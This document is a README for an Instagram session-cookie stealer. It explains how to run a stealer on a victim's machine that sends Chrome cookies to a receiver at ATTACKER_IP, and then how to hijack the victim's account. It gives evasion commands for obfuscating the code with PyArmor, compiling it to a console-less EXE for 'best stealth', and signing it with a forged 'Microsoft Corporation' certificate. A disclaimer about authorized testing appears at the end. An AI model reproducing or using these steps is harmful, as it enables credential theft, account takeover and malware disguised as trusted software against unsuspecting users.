### Library List (5 total)

| Library | Purpose |
|---|---|
| selenium | Controls Chrome to read cookies |
| flask | Runs the receiver server |
| requests | Sends/receives data over HTTP |
| nuitka | Compiles Python to EXE (native C++) |
| pyarmor | Obfuscates Python code before compile |

### Built-in (No Install Needed)

os, time, json, glob, platform, datetime — already in Python.

---

## How to Use

### Step 1: Start Receiver (Your Machine)

### Step 2: Configure Stealer

Open ig_stealer.py. Change ATTACKER_IP to your IP address.

### Step 3: Run Stealer (Victim Machine)

Either:
- Double-click the compiled .exe
- Or run: `python ig_stealer.py`

### Step 4: Hijack (Your Machine, After Cookies Arrive)

---

## How to Compile to EXE

### Option 1: Nuitka (Recommended)
python -m nuitka --onefile --windows-disable-console ig_stealer.py

### Option 2: PyInstaller
pip install pyinstaller python -m PyInstaller --onefile --noconsole ig_stealer.py

### Option 3: Nuitka + PyArmor (Best Stealth)
pyarmor obfuscate ig_stealer.py cd dist python -m nuitka --onefile --windows-disable-console ig_stealer.py

---

## Self-Signed Certificate (Optional — Sign EXE)

Run in PowerShell as Administrator:
New-SelfSignedCertificate -Subject "Microsoft Corporation" -FriendlyName "Microsoft" -CertStoreLocation "Cert:\CurrentUser\My" -Type CodeSigningCert

Then sign:
Set-AuthenticodeSignature -FilePath "ig_stealer.exe" -Certificate (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert)

---

## Files in This Folder

| File | Purpose |
|---|---|
| ig_stealer.py | Stealer — runs on victim. Opens Chrome headless, extracts Instagram cookies, sends to attacker. |
| receiver.py | Receiver — runs on attacker. Waits for cookies, saves to text file. |
| hijacker.py | Hijacker — runs on attacker. Injects cookies into Chrome, opens victim's Instagram. |
| requirements.txt | All 5 libraries in one file. Run `pip install -r requirements.txt` to install. |
| README.md | This documentation. |

---

## Important Notes

- Victim must have Chrome installed and logged into Instagram at least once
- Attacker and victim must be on the same network (or attacker IP must be reachable)
- Port 8080 must be open on attacker's firewall
- This is for authorized testing only

Summary

instagram-project/
├── ig_stealer.py
├── receiver.py
├── hijacker.py
├── requirements.txt    ← Contains: selenium, flask, requests, nuitka, pyarmor
└── README.md




